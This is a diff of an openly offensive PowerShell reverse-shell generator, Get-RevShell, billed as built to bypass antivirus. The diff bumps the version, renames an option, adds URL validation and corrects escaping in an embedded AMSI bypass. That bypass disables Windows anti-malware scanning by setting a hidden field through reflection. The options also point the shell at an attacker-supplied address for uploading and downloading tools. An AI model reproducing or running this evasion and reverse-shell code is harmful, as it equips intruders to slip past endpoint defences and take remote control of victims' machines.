@@ -1,7 +1,7 @@
 ﻿function Get-RevShell {
 #.SYNOPSIS
 # Robust and modular PowerShell RevShell generator meant to bypass AV.
-# ARBITRARY VERSION NUMBER:  2.0.0
+# ARBITRARY VERSION NUMBER:  2.0.1
 # AUTHOR:  Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -27,7 +27,7 @@
 #    
 #    Modular Options 
 #      -AmsiBypass          -->  Disable AMSI in current session (valid: 23 May 2023)
-#      -HTTPSBypass         -->  Disable self-signed certificate checks
+#      -HttpsBypass         -->  Disable self-signed certificate checks
 #      -PowerShell2Support  -->  Adjust RevShell to support PowerShell 2.0
 #      -WebClientURL        -->  URL to point to webclient tools to (upload, download, import)
 #
@@ -127,7 +127,7 @@ Add-Type $Var8;
     if ($AmsiBypass) {
 
     $Bypass2 = @"
-$Var9 = [Ref].Assembly.GetTypes() | %{if ($_.Name -like "*Am*s*ils*") {$_.GetFields("NonPublic,Static") | ?{$_.Name -like "*ailed*"}}};
+$Var9 = [Ref].Assembly.GetTypes() | %{if (`$_.Name -like "*Am*s*ils*") {`$_.GetFields("NonPublic,Static") | ?{`$_.Name -like "*ailed*"}}};
 $Var9.SetValue(`$NULL,`$TRUE);`n
 "@
     }
@@ -138,6 +138,7 @@ $Var9.SetValue(`$NULL,`$TRUE);`n
     if ($WebClientURL -ne 'http(s)://<ip_addr>') {
         
         # Error Correction
+        if ($WebClientURL -notlike "http*") { return (Write-Host 'Invalid URL.' -ForegroundColor Red) }
         if (($WebClientURL -like "https:*") -and !$HTTPSBypass) {
             if (!$HTTPSBypass) { return (Write-Host 'HTTPS bypass required to communicate over SSL.' -ForegroundColor Red) }
         }
